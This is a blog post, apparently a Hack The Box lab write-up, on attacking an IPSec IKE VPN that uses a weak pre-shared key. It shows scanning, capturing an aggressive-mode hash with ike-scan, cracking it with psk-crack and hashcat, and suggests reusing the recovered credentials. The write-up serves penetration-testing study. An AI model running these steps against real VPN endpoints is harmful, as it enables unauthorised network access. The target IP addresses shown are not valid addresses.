---
title: "Attacking IPSec IKE with insecure PSK"
description:
date: 2025-12-28T15:25
tags: infosec,redteam
draft: false
---

::: note
This post describes a scenario I encountered while solving a
"box" at [HTB Labs]. As such, it only focuses on the actions taken in
the specific case.

For more information about general attacks to IPSec and IKE, see the
reference links at the end of the page.
:::

[HTB Labs]: https://app.hackthebox.com/


## Discovery

A port scan reveals port `500/udp` is open:

```shell
$ nmap -sU $TARGET -T5
PORT      STATE  SERVICE
500/udp   open   isakmp
```

The port is commonly used by the [ISAKMP] service, part of the [IPSec]
suite and responsible for handling key exchange through the [IKE]
service.

## Probing

Using [ike-scan], we can get more information about the endpoint, and the supported transformations:

```shell
$ ike-scan -M $TARGET
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.123.436	Main Mode Handshake returned
	HDR=(CKY-R=a5b21e95b0e85fd9)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.044 seconds (22.53 hosts/sec).  1 returned handshake; 0 returned notify
```

Also check "aggressive mode", which, when using PSK authentication,
will return a plain text hash we can use for offline cracking:

```shell
$ ike-scan -M -A -P $TARGET
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.123.436	Aggressive Mode Handshake returned
	HDR=(CKY-R=02b63ef4bd664662)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=someuser@example.com)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)
```

Normally, we would need to use various bruteforcing techniques to
determine a valid client ID to use for the key exchange process.

In this scenario, it appears any client ID is accepted by the server.

Let's retrieve our connection parameters (including the hash) and
store them to a file:

```shell
$ ike-scan -M -A -Pparams.txt $TARGET
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.123.456	Aggressive Mode Handshake returned
	HDR=(CKY-R=e7c8381dccab3ea1)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=user@example.com)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.060 seconds (16.69 hosts/sec).  1 returned handshake; 0 returned notify
```

We can then use `psk-crack` (from the [ike-scan] suite) to crack the hash:

```shell
$ psk-crack params.txt -d <(gunzip < /usr/share/wordlists/rockyou.txt.gz)
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "secretpassword" matches SHA1 hash 6adfb183a4a2c94a2f92dab5ade762a47889a5a1
Ending psk-crack: 8045040 iterations in 3.159 seconds (2546545.85 iterations/sec)
```

Or hashcat (use `hashcat -hh` to list hash types, search for IKE-SHA1):

```shell
$ hashcat -m 5400 -a 0 params.txt /usr/share/wordlists/rockyou.txt.gz
[...]
...:6adfb183a4a2c94a2f92dab5ade762a47889a5a1:secretpassword
[...]
```

We could now use `vpnc` to attempt to connect to the IPSec vpn.

Or perhaps attempt to reuse the gathered credentials to access some different service on the same system.


## Reference links

- [HackTricks: Pentesting IPsec/IKE VPN](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html)

[ISAKMP]: https://en.wikipedia.org/wiki/Internet_Security_Association_and_Key_Management_Protocol
[IKE]: https://en.wikipedia.org/wiki/Internet_Key_Exchange
[IPSec]: https://en.wikipedia.org/wiki/IPsec
[ike-scan]: https://github.com/royhills/ike-scan
